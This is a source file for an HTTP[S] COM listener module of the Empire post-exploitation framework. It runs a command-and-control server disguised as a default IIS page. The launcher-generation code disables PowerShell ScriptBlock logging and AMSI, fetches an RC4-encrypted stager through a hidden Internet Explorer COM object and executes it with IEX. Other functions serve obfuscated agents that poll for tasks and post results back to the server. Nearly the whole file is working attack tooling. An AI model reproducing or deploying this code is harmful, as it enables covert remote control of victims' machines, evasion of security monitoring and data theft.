import logging
import base64
import random
import os
import ssl
import time
import copy
from pydispatch import dispatcher
from flask import Flask, request, make_response

# Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages


class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'HTTP[S] COM',

            'Author': ['@harmj0y'],

            'Description': ('Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach '
                            'using a hidden Internet Explorer COM object.'),

            'Category' : ('client_server'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'http_com'
            },
            'Host' : {
                'Description'   :   'Hostname/IP for staging.',
                'Required'      :   True,
                'Value'         :   "http://%s:%s" % (helpers.lhost(), 80)
            },
            'BindIP' : {
                'Description'   :   'The IP to bind to on the control server.',
                'Required'      :   True,
                'Value'         :   '0.0.0.0'
            },
            'Port' : {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   80
            },
            'Launcher' : {
                'Description'   :   'Launcher string.',
                'Required'      :   True,
                'Value'         :   'powershell -noP -sta -w 1 -enc '
            },
            'StagingKey' : {
                'Description'   :   'Staging key for initial agent negotiation.',
                'Required'      :   True,
                'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   5
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   60
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent.',
                'Required'      :   True,
                'Value'         :   "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
            },
            'CertPath' : {
                'Description'   :   'Certificate path for https listeners.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ServerVersion' : {
                'Description'   :   'Server header for the control server.',
                'Required'      :   True,
                'Value'         :   'Microsoft-IIS/7.5'
            }
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module
        self.app = None
        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        # set the default staging key to the controller db default
        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])


    def default_response(self):
        """
        Returns a default HTTP server page.
        """
        page = "<html><body><h1>It works!</h1>"
        page += "<p>This is the default web page for this server.</p>"
        page += "<p>The web server software is running but no content has been added, yet.</p>"
        page += "</body></html>"
        return page


    def validate_options(self):
        """
        Validate all options for this listener.
        """

        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True


    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
        """
        Generate a basic launcher for the specified listener.
        """

        if not language:
            print helpers.color('[!] listeners/http_com generate_launcher(): no language specified!')

        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            host = listenerOptions['Host']['Value']
            launcher = listenerOptions['Launcher']['Value']
            stagingKey = listenerOptions['StagingKey']['Value']
            profile = listenerOptions['DefaultProfile']['Value']
            uris = [a for a in profile.split('|')[0].split(',')]
            stage0 = random.choice(uris)

            if language.startswith('po'):
                # PowerShell

                stager = ''
                if safeChecks.lower() == 'true':
                    # ScriptBlock Logging bypass
                    stager = helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.Utils'"
                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                    stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
                    stager += helpers.randomize_capitalization(").GetValue($null);$GroupPolicySettings")
                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;"
                    stager += helpers.randomize_capitalization("$GroupPolicySettings")
                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;"

                    # @mattifestation's AMSI bypass
                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.AmsiUtils'"
                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                    stager += "'amsiInitFailed','NonPublic,Static'"
                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
                    stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

                # TODO: reimplement stager retries?

                #check if we're using IPv6
                listenerOptions = copy.deepcopy(listenerOptions)
                bindIP = listenerOptions['BindIP']['Value']
                port = listenerOptions['Port']['Value']
                if ':' in bindIP:
                    if "http" in host:
                        if "https" in host:
                            host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                        else:
                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port) 

                # code to turn the key string into a byte array
                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                stager += "'%s');" % (stagingKey)

                # this is the minimized RC4 stager code from rc4.ps1
                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                # add the RC4 packet to a header location
                stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
                stager += "$ser='%s';$t='%s';" % (host, stage0)
                stager += "$ie.navigate2($ser+$t,$fl,0,$Null,'CF-RAY: %s');"  % (b64RoutingPacket)
                stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
                stager += "$ht = $ie.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie.document, $Null).InnerHtml;"
                stager += "try {$data=[System.Convert]::FromBase64String($ht)} catch {$Null}"
                stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")

                # decode everything and kick it over to IEX to kick off execution
                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                if obfuscate:
                    stager = helpers.obfuscate(stager, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
                # base64 encode the stager and return it
                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            else:
                print helpers.color("[!] listeners/http_com generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module.")

        else:
            print helpers.color("[!] listeners/http_com generate_launcher(): invalid listener name specification!")


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
        """
        Generate the stager code needed for communications with this listener.
        """

        if not language:
            print helpers.color('[!] listeners/http_com generate_stager(): no language specified!')
            return None

        profile = listenerOptions['DefaultProfile']['Value']
        uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
        stagingKey = listenerOptions['StagingKey']['Value']
        host = listenerOptions['Host']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        
        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == 'powershell':

            # read in the stager base
            f = open("%s/data/agent/stagers/http_com.ps1" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            # make sure the server ends with "/"
            if not host.endswith("/"):
                host += "/"

            # patch the server and key information
            stager = stager.replace('REPLACE_SERVER', host)
            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
            stager = stager.replace('index.jsp', stage1)
            stager = stager.replace('index.php', stage2)

            #patch in working hours, if any
            if workingHours != "":
                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)

            randomizedStager = ''

            for line in stager.split("\n"):
                line = line.strip()
                # skip commented line
                if not line.startswith("#"):
                    # randomize capitalization of lines without quoted strings
                    if "\"" not in line:
                        randomizedStager += helpers.randomize_capitalization(line)
                    else:
                        randomizedStager += line

            if obfuscate:
                randomizedStager = helpers.obfuscate(randomizedStager, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(randomizedStager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
            else:
                # otherwise just return the case-randomized stager
                return randomizedStager

        else:
            print helpers.color("[!] listeners/http_com generate_stager(): invalid language specification, only 'powershell' is current supported for this module.")


    def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
        """
        Generate the full agent code needed for communications with this listener.
        """

        if not language:
            print helpers.color('[!] listeners/http_com generate_agent(): no language specified!')
            return None

        language = language.lower()
        delay = listenerOptions['DefaultDelay']['Value']
        jitter = listenerOptions['DefaultJitter']['Value']
        profile = listenerOptions['DefaultProfile']['Value']
        lostLimit = listenerOptions['DefaultLostLimit']['Value']
        killDate = listenerOptions['KillDate']['Value']
        b64DefaultResponse = base64.b64encode(self.default_response())

        if language == 'powershell':

            f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64DefaultResponse+'"')

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
            if obfuscate:
                code = helpers.obfuscate(code, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
            return code

        else:
            print helpers.color("[!] listeners/http_com generate_agent(): invalid language specification, only 'powershell' is currently supported for this module.")


    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """

        if language:
            if language.lower() == 'powershell':
                
                updateServers = """
                    $Script:ControlServers = @("%s");
                    $Script:ServerIndex = 0;

                    if(-not $IE) {
                        $Script:IE=New-Object -COM InternetExplorer.Application;
                        $Script:IE.Silent = $True
                        $Script:IE.visible = $False
                    }
                    else {
                        $Script:IE = $IE
                    }

                """ % (listenerOptions['Host']['Value'])
                
                getTask = """
                    function script:Get-Task {
                        try {
                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {

                                # meta 'TASKING_REQUEST' : 4
                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
                                $Headers = "CF-RAY: $RoutingCookie"

                                # choose a random valid URI for checkin
                                $taskURI = $script:TaskURIs | Get-Random
                                $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI

                                $Script:IE.navigate2($ServerURI, 14, 0, $Null, $Headers)
                                while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
                                $html = $Script:IE.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $Script:IE.document, $Null).InnerHtml
                                try {
                                    [System.Convert]::FromBase64String($html)
                                }
                                catch {$Null}
                            }
                        }
                        catch {
                            $script:MissedCheckins += 1
                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                # restart key negotiation
                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
                            }
                        }
                    }
                """

                sendMessage = """
                    function script:Send-Message {
                        param($Packets)

                        if($Packets) {
                            # build and encrypt the response packet
                            $EncBytes = Encrypt-Bytes $Packets

                            # build the top level RC4 "routing packet"
                            # meta 'RESULT_POST' : 5
                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5

                            $bytes=$e.GetBytes([System.Convert]::ToBase64String($RoutingPacket));

                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {

                                try {
                                    # choose a random valid URI for checkin
                                    $taskURI = $script:TaskURIs | Get-Random
                                    $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI

                                    $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Null)
                                    while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
                                }
                                catch [System.Net.WebException]{
                                    # exception posting data...
                                }
                            }
                        }
                    }
                """

                return updateServers + getTask + sendMessage

            else:
                print helpers.color("[!] listeners/http_com generate_comms(): invalid language specification, only 'powershell' is currently supported for this module.")
        else:
            print helpers.color('[!] listeners/http_com generate_comms(): no language specified!')


    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up the Flask server.
        """

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        # suppress the normal Flask output
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        bindIP = listenerOptions['BindIP']['Value']
        host = listenerOptions['Host']['Value']
        port = listenerOptions['Port']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']

        app = Flask(__name__)
        self.app = app

        @app.before_request
        def check_ip():
            """
            Before every request, check if the IP address is allowed.
            """
            if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
                dispatcher.send("[!] %s on the blacklist/not on the whitelist requested resource" % (request.remote_addr), sender="listeners/http_com")
                return make_response(self.default_response(), 200)


        @app.after_request
        def change_header(response):
            "Modify the default server version in the response."
            response.headers['Server'] = listenerOptions['ServerVersion']['Value']
            return response


        @app.after_request
        def add_proxy_headers(response):
            "Add HTTP headers to avoid proxy caching."
            response.headers['Cache-Control'] = "no-cache, no-store, must-revalidate"
            response.headers['Pragma'] = "no-cache"
            response.headers['Expires'] = "0"
            return response


        @app.route('/<path:request_uri>', methods=['GET'])
        def handle_get(request_uri):
            """
            Handle an agent GET request.

            This is used during the first step of the staging process,
            and when the agent requests taskings.
            """

            clientIP = request.remote_addr
            dispatcher.send("[*] GET request for %s/%s from %s" % (request.host, request_uri, clientIP), sender='listeners/http_com')
            routingPacket = None
            cfRay = request.headers.get('CF-RAY')
            if cfRay and cfRay != '':
                try:
                    # decode the routing packet base64 value from the cfRay header location
                    routingPacket = base64.b64decode(cfRay)
                except Exception as e:
                    routingPacket = None

            if routingPacket:
                # parse the routing packet and process the results
                dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, clientIP)
                if dataResults and len(dataResults) > 0:
                    for (language, results) in dataResults:
                        if results:
                            if results == 'STAGE0':
                                # handle_agent_data() signals that the listener should return the stager.ps1 code

                                # step 2 of negotiation -> return stager.ps1 (stage 1)
                                dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/http_com')
                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                                return make_response(base64.b64encode(stage), 200)

                            elif results.startswith('ERROR:'):
                                dispatcher.send("[!] Error from agents.handle_agent_data() for %s from %s: %s" % (request_uri, clientIP, results), sender='listeners/http_com')

                                if 'not in cache' in results:
                                    # signal the client to restage
                                    print helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP))
                                    return make_response(self.default_response(), 401)
                                else:
                                    return make_response(self.default_response(), 200)

                            else:
                                # actual taskings
                                dispatcher.send("[*] Agent from %s retrieved taskings" % (clientIP), sender='listeners/http_com')
                                return make_response(base64.b64encode(results), 200)
                        else:
                            # dispatcher.send("[!] Results are None...", sender='listeners/http_com')
                            return make_response(self.default_response(), 200)
                else:
                    return make_response(self.default_response(), 200)

            else:
                dispatcher.send("[!] %s requested by %s with no routing packet." % (request_uri, clientIP), sender='listeners/http_com')
                return make_response(self.default_response(), 200)


        @app.route('/<path:request_uri>', methods=['POST'])
        def handle_post(request_uri):
            """
            Handle an agent POST request.
            """

            stagingKey = listenerOptions['StagingKey']['Value']
            clientIP = request.remote_addr

            # the routing packet should be at the front of the binary request.data
            #   NOTE: this can also go into a cookie/etc.
            try:
                requestData = base64.b64decode(request.get_data())
            except:
                requestData = None

            dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, requestData, listenerOptions, clientIP)
            if dataResults and len(dataResults) > 0:
                for (language, results) in dataResults:
                    if results:
                        if results.startswith('STAGE2'):
                            # TODO: document the exact results structure returned
                            sessionID = results.split(' ')[1].strip()
                            sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
                            dispatcher.send("[*] Sending agent (stage 2) to %s at %s" % (sessionID, clientIP), sender='listeners/http_com')

                            # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                            agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                            encrypted_agent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                            # TODO: wrap ^ in a routing packet?

                            return make_response(base64.b64encode(encrypted_agent), 200)

                        elif results[:10].lower().startswith('error') or results[:10].lower().startswith('exception'):
                            dispatcher.send("[!] Error returned for results by %s : %s" %(clientIP, results), sender='listeners/http_com')
                            return make_response(self.default_response(), 200)
                        elif results == 'VALID':
                            dispatcher.send("[*] Valid results return by %s" % (clientIP), sender='listeners/http_com')
                            return make_response(self.default_response(), 200)
                        else:
                            return make_response(base64.b64encode(results), 200)
                    else:
                        return make_response(self.default_response(), 200)
            else:
                return make_response(self.default_response(), 200)

        try:
            certPath = listenerOptions['CertPath']['Value']
            host = listenerOptions['Host']['Value']
            if certPath.strip() != '' and host.startswith('https'):
                certPath = os.path.abspath(certPath)
                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
                context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
            else:
                app.run(host=bindIP, port=int(port), threaded=True)

        except Exception as e:
            print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
            dispatcher.send("[!] Listener startup on port %s failed: %s " % (port, e), sender='listeners/http_com')


    def start(self, name=''):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()


    def shutdown(self, name=''):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))
            self.threads[name].kill()
        else:
            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
            self.threads[self.options['Name']['Value']].kill()
